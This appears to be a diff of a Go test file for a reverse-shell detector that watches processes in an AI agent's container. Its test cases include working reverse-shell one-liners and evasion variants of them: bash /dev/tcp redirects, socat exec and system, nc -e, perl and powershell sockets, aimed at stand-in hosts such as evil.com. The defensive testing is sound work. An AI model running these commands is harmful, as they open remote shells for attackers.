@@ -73,7 +73,7 @@ func TestDetectReverseShells(t *testing.T) {
 		},
 
 		// True positives must survive the tightened heuristic: real reverse
-		// shells all carry a socket/tcp/udp/connect keyword, an IP, or a
+		// shells all carry a socket/tcp/udp keyword, an IP, or a
 		// host:port endpoint.
 		{
 			name: "python reverse shell with socket+IP",
@@ -106,6 +106,112 @@ func TestDetectReverseShells(t *testing.T) {
 			},
 			wantCount: 1,
 		},
+		// socat SYSTEM: is EXEC:'s twin; with a dotless host, decimal or IPv6
+		// address there is no network indicator, so it must be self-sufficient
+		// on a socat command line.
+		// Benign agent commands that used to auto-kill the container (CRITICAL).
+		{name: "rg for socat exec: in source", processes: []Process{{PID: 1, User: "1000", Command: `rg -n "exec:" internal/`}}, wantCount: 0},
+		{name: "bash wrapper running rg exec:", processes: []Process{{PID: 1, User: "1000", Command: `/bin/bash -c source /tmp/snap.sh && rg -n "EXEC:" internal/monitor`}}, wantCount: 0},
+		{name: "grep for /dev/tcp/ in docs", processes: []Process{{PID: 1, User: "1000", Command: `grep -rn /dev/tcp/ docs`}}, wantCount: 0},
+		{name: "loopback port probe via /dev/tcp", processes: []Process{{PID: 1, User: "1000", Command: `bash -c </dev/tcp/localhost/5432`}}, wantCount: 0},
+		{name: "loopback /dev/tcp write probe", processes: []Process{{PID: 1, User: "1000", Command: `timeout 1 bash -c cat < /dev/null > /dev/tcp/127.0.0.1/8080`}}, wantCount: 0},
+		{name: "perl -MIO::File", processes: []Process{{PID: 1, User: "1000", Command: `perl -MIO::File -e 'print 1'`}}, wantCount: 0},
+		{name: "script named *.sh run with -i", processes: []Process{{PID: 1, User: "1000", Command: `./scripts/setup.sh -i`}}, wantCount: 0},
+		{name: "hyphenated binary ending in -sh -i", processes: []Process{{PID: 1, User: "1000", Command: `/usr/local/bin/kube-sh -i`}}, wantCount: 0},
+		{name: "python -c health-checking local dev server", processes: []Process{{PID: 1, User: "1000", Command: `python3 -c 'import urllib.request; print(urllib.request.urlopen("http://127.0.0.1:8000/health").status)'`}}, wantCount: 0},
+		{name: "python -c touching docker.sock path", processes: []Process{{PID: 1, User: "1000", Command: `python3 -c 'import os; print(os.path.exists("/var/run/docker.sock"))'`}}, wantCount: 0},
+		{name: "python -c reading SSH_AUTH_SOCK", processes: []Process{{PID: 1, User: "1000", Command: `python3 -c 'import os; print(os.environ.get("SSH_AUTH_SOCK"))'`}}, wantCount: 0},
+		{name: "python -c printing a file:line", processes: []Process{{PID: 1, User: "1000", Command: `python3 -c 'print("error at app.py:12")'`}}, wantCount: 0},
+
+		// ...while the real forms of those patterns still fire.
+		// Bypasses found in review of the redirect-position rule: bash connects
+		// through quotes, variables, >| and escapes; a 127.* prefix is not loopback.
+		// Bypasses of the endpoint-regex version (#857 review): bash connects
+		// with any of these, so only bare mentions and literal loopback
+		// endpoints may be ignored.
+		{name: "host from command substitution", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/$(echo 1.2.3.4)/4444; sh <&3 >&3`}}, wantCount: 1},
+		{name: "quoted host", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/"1.2.3.4"/4444`}}, wantCount: 1},
+		{name: "quoted port", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/1.2.3.4/"4444"`}}, wantCount: 1},
+		{name: "port from backticks", processes: []Process{{PID: 1, User: "1000", Command: "bash -c exec 3<>/dev/tcp/1.2.3.4/`echo 4444`"}}, wantCount: 1},
+		{name: "empty-quote concatenation", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/1.2.3.4''/4444`}}, wantCount: 1},
+		{name: "service-name port", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/evil.com/https`}}, wantCount: 1},
+		// A literal loopback host with a variable port is a local probe: the
+		// port can't change the host (review of #859).
+		{name: "loopback host with variable port", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/localhost/$P`}}, wantCount: 0},
+		{name: "wait-for-port loop with $PORT", processes: []Process{{PID: 1, User: "1000", Command: `bash -c until echo > /dev/tcp/localhost/$PORT; do sleep 1; done`}}, wantCount: 0},
+		{name: "wait-for-port with default expansion", processes: []Process{{PID: 1, User: "1000", Command: `bash -c until (</dev/tcp/127.0.0.1/${PORT:-8080}) 2>/dev/null; do sleep 1; done`}}, wantCount: 0},
+		{name: "variable host is still checked", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/$H/$P`}}, wantCount: 1},
+		{name: "loopback shorthand 127.1 probe", processes: []Process{{PID: 1, User: "1000", Command: `bash -c </dev/tcp/127.1/8080`}}, wantCount: 0},
+		{name: "quoted loopback probe", processes: []Process{{PID: 1, User: "1000", Command: `bash -c </dev/tcp/"localhost"/5432`}}, wantCount: 0},
+		{name: "grep for /dev/tcp/ in single quotes", processes: []Process{{PID: 1, User: "1000", Command: `grep -rn '/dev/tcp/' docs`}}, wantCount: 0},
+		// socat net-address rule must not fire on look-alike words.
+		{name: "k8s manifest with exec and tcpSocket probes", processes: []Process{{PID: 1, User: "1000", Command: "bash -c cat > k8s.yaml <<EOF livenessProbe:\n  exec:\n    command: [x]\n readinessProbe:\n  tcpSocket:\n    port: 8080\nEOF"}}, wantCount: 0},
+		{name: "rg for tcp: or exec:", processes: []Process{{PID: 1, User: "1000", Command: `rg -n "tcp:|exec:" src/`}}, wantCount: 0},
+		{name: "renamed socat with IPv6 address", processes: []Process{{PID: 1, User: "1000", Command: `/tmp/x tcp6:[2001:db8::1]:443 exec:sh`}}, wantCount: 1},
+		{name: "renamed socat listener", processes: []Process{{PID: 1, User: "1000", Command: `/tmp/x tcp-listen:4444,reuseaddr exec:sh`}}, wantCount: 1},
+		// False positives found in review of #858 (CRITICAL kills the agent's
+		// container): wait-for-service loops probing loopback inside a subshell
+		// or command substitution, and /dev/tcp text in non-shell programs.
+		{name: "wait loop with subshell loopback probe", processes: []Process{{PID: 1, User: "1000", Command: `bash -c until (echo > /dev/tcp/localhost/5432) >/dev/null 2>&1; do sleep 1; done`}}, wantCount: 0},
+		{name: "while-not subshell loopback probe", processes: []Process{{PID: 1, User: "1000", Command: `bash -c while ! (: </dev/tcp/127.0.0.1/6379); do sleep 1; done`}}, wantCount: 0},
+		{name: "command substitution loopback read", processes: []Process{{PID: 1, User: "1000", Command: `bash -c x=$(</dev/tcp/localhost/80)`}}, wantCount: 0},
+		{name: "nested bash -c with escaped quotes", processes: []Process{{PID: 1, User: "1000", Command: `bash -c bash -c "until (echo > \"/dev/tcp/localhost/5432\"); do sleep 1; done"`}}, wantCount: 0},
+		{name: "git commit message mentioning /dev/tcp", processes: []Process{{PID: 1, User: "1000", Command: `git commit -m fix: detect /dev/tcp/host/port redirects`}}, wantCount: 0},
+		{name: "grep for a loopback /dev/tcp path", processes: []Process{{PID: 1, User: "1000", Command: `grep -rn "/dev/tcp/127.0.0.1/" .`}}, wantCount: 0},
+		{name: "sed rewriting /dev/tcp text", processes: []Process{{PID: 1, User: "1000", Command: `sed -i s|/dev/tcp/$host/$port|x| script.sh`}}, wantCount: 0},
+		{name: "k8s manifest with exec and a tcp:// URL", processes: []Process{{PID: 1, User: "1000", Command: "bash -c cat > k.yaml <<EOF\n  exec:\n    command: [x]\n  value: \"tcp://docker:2375\"\nEOF"}}, wantCount: 0},
+		{name: "double-quoted /dev/tcp path", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>"/dev/tcp/10.0.0.1/4444"; cat <&3 | sh >&3 2>&3`}}, wantCount: 1},
+		{name: "single-quoted /dev/tcp path", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>'/dev/tcp/10.0.0.1/4444'; sh <&3 >&3`}}, wantCount: 1},
+		{name: "/dev/tcp path in a variable", processes: []Process{{PID: 1, User: "1000", Command: `bash -c d=/dev/tcp/10.0.0.1/4444; exec 3<>$d; sh <&3 >&3 2>&3`}}, wantCount: 1},
+		{name: "clobber redirect >| /dev/tcp", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3>|/dev/tcp/10.0.0.1/4444`}}, wantCount: 1},
+		{name: "escaped /dev/tcp path", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>\/dev/tcp/10.0.0.1/4444`}}, wantCount: 1},
+		{name: "/dev/tcp with variable port", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/evil.example.com/$PORT`}}, wantCount: 1},
+		{name: "127.* DNS name is not loopback", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/127.0.0.1.evil.com/4444; sh <&3 >&3 2>&3`}}, wantCount: 1},
+		{name: "localhost.* DNS name is not loopback", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 3<>/dev/tcp/localhost.evil.com/4444`}}, wantCount: 1},
+		{name: "python -c to 127.* DNS name:port", processes: []Process{{PID: 1, User: "1000", Command: `python3 -c 'import urllib.request; urllib.request.urlopen("http://127.0.0.1.evil.com:8000/x")'`}}, wantCount: 1},
+		{name: "renamed socat binary with exec:", processes: []Process{{PID: 1, User: "1000", Command: `/tmp/x tcp:10.0.0.1:4444 exec:sh`}}, wantCount: 1},
+		{name: "renamed socat with openssl and system:", processes: []Process{{PID: 1, User: "1000", Command: `/tmp/x openssl-connect:evil:443 system:sh`}}, wantCount: 1},
+		{name: "IPv6 loopback /dev/tcp probe", processes: []Process{{PID: 1, User: "1000", Command: `bash -c </dev/tcp/::1/5432`}}, wantCount: 0},
+		{name: "rg for /dev/tcp/ in quotes", processes: []Process{{PID: 1, User: "1000", Command: `rg -n "/dev/tcp/" internal/`}}, wantCount: 0},
+		{name: "grep for exec: with a tcp word nearby", processes: []Process{{PID: 1, User: "1000", Command: `grep -rn "exec:" docs/tcp-notes.md`}}, wantCount: 0},
+		{name: "bash exec fd to remote /dev/tcp", processes: []Process{{PID: 1, User: "1000", Command: `bash -c exec 5<>/dev/tcp/evil.example.com/443; cat <&5 | sh >&5`}}, wantCount: 1},
+		{name: "udp redirect reverse shell", processes: []Process{{PID: 1, User: "1000", Command: `zsh -c 'zmodload x; cat >& /dev/udp/10.0.0.1/53 0>&1'`}}, wantCount: 1},
+		{name: "perl -MIO reverse shell", processes: []Process{{PID: 1, User: "1000", Command: `perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4444");STDIN->fdopen($c,r);'`}}, wantCount: 1},
+		{name: "perl -MIO::Socket::INET", processes: []Process{{PID: 1, User: "1000", Command: `perl -MIO::Socket::INET -e 'print 1'`}}, wantCount: 1},
+		{name: "python -c to remote host:port stays a one-liner match", processes: []Process{{PID: 1, User: "1000", Command: `python3 -c 'import urllib.request; urllib.request.urlopen("http://evil.example.com:8080/x")'`}}, wantCount: 1},
+		{name: "socat EXEC: still fires", processes: []Process{{PID: 1, User: "1000", Command: `/usr/bin/socat tcp-connect:attacker:443 exec:/bin/sh,pty`}}, wantCount: 1},
+		{name: "path-qualified sh -i still fires", processes: []Process{{PID: 1, User: "1000", Command: `/bin/sh -i`}}, wantCount: 1},
+
+		{
+			name:      "socat SYSTEM: with dotless hostname",
+			processes: []Process{{PID: 1234, User: "1000", Command: `socat OPENSSL:attacker:443 SYSTEM:sh`}},
+			wantCount: 1,
+		},
+		{
+			name:      "socat SYSTEM: with decimal IP",
+			processes: []Process{{PID: 1234, User: "1000", Command: `socat OPENSSL:3232235777:443 SYSTEM:/bin/sh`}},
+			wantCount: 1,
+		},
+		{
+			name:      "socat SYSTEM: with IPv6 address",
+			processes: []Process{{PID: 1234, User: "1000", Command: `/usr/bin/socat OPENSSL:[2001:db8::1]:443 SYSTEM:sh`}},
+			wantCount: 1,
+		},
+		{
+			name:      "system: without socat is not a reverse shell",
+			processes: []Process{{PID: 1234, User: "1000", Command: `kubectl get pods -n kube-system: --watch`}},
+			wantCount: 0,
+		},
+		// Token anchoring stopped "sh -i" from matching inside these shell
+		// names, so each must be listed explicitly.
+		{name: "csh -i", processes: []Process{{PID: 1, User: "1000", Command: `csh -i`}}, wantCount: 1},
+		{name: "tcsh -i", processes: []Process{{PID: 1, User: "1000", Command: `tcsh -i >& /dev/null`}}, wantCount: 1},
+		{name: "mksh -i", processes: []Process{{PID: 1, User: "1000", Command: `/bin/mksh -i`}}, wantCount: 1},
+		{name: "oksh -i", processes: []Process{{PID: 1, User: "1000", Command: `oksh -i`}}, wantCount: 1},
+		{name: "lksh -i", processes: []Process{{PID: 1, User: "1000", Command: `lksh -i`}}, wantCount: 1},
+		{name: "posh -i", processes: []Process{{PID: 1, User: "1000", Command: `posh -i`}}, wantCount: 1},
+		{name: "yash -i", processes: []Process{{PID: 1, User: "1000", Command: `yash -i`}}, wantCount: 1},
+		{name: "rbash -i", processes: []Process{{PID: 1, User: "1000", Command: `rbash -i`}}, wantCount: 1},
 		{
 			name: "nc -e with hostname (no dotted IP) stays detected",
 			processes: []Process{
@@ -117,6 +223,65 @@ func TestDetectReverseShells(t *testing.T) {
 			name: "interactive bash shell flagged regardless of network indicator",
 			processes: []Process{
 				{PID: 1234, User: "1000", Command: `bash -i`},
+			},
+			wantCount: 1,
+		},
+		// Benign agent commands that only mention a tool name or contain a
+		// pattern glued inside another word. Each was a CRITICAL match, which
+		// auto-kills the container under the default auto_kill_on_critical.
+		{
+			name: "installing or locating socat is not a reverse shell",
+			processes: []Process{
+				{PID: 1, User: "1000", Command: `sudo apt-get install -y socat`},
+				{PID: 2, User: "1000", Command: `which socat`},
+			},
+			wantCount: 0,
+		},
+		{
+			name: "searching for powershell is not a reverse shell",
+			processes: []Process{
+				{PID: 1, User: "1000", Command: `rg -i powershell docs/`},
+			},
+			wantCount: 0,
+		},
+		{
+			name: "rsync -e does not match nc -e",
+			processes: []Process{
+				{PID: 1, User: "1000", Command: `rsync -e ssh ./a ./b`},
+			},
+			wantCount: 0,
+		},
+		{
+			name: "ssh -i does not match sh -i",
+			processes: []Process{
+				{PID: 1, User: "1000", Command: `ssh -i /home/code/.ssh/deploy_key git@github.com`},
+			},
+			wantCount: 0,
+		},
+		// The real attack forms of those patterns stay detected.
+		{
+			name: "netcat and sh by absolute path stay detected",
+			processes: []Process{
+				{PID: 1, User: "1000", Command: `/usr/bin/nc -e /bin/sh evilhost 4444`},
+				{PID: 2, User: "1000", Command: `/bin/sh -i`},
+			},
+			wantCount: 2,
+		},
+		{
+			name: "other interactive shells keep matching after token anchoring",
+			processes: []Process{
+				{PID: 1, User: "1000", Command: `zsh -i`},
+				{PID: 2, User: "1000", Command: `/bin/dash -i`},
+				{PID: 3, User: "1000", Command: `ksh -i`},
+				{PID: 4, User: "1000", Command: `/bin/ash -i`},
+				{PID: 5, User: "1000", Command: `fish -i`},
+			},
+			wantCount: 5,
+		},
+		{
+			name: "powershell TCP reverse shell stays detected",
+			processes: []Process{
+				{PID: 1, User: "1000", Command: `powershell -nop -c $c=New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444)`},
 			},
 			wantCount: 1,
 		},
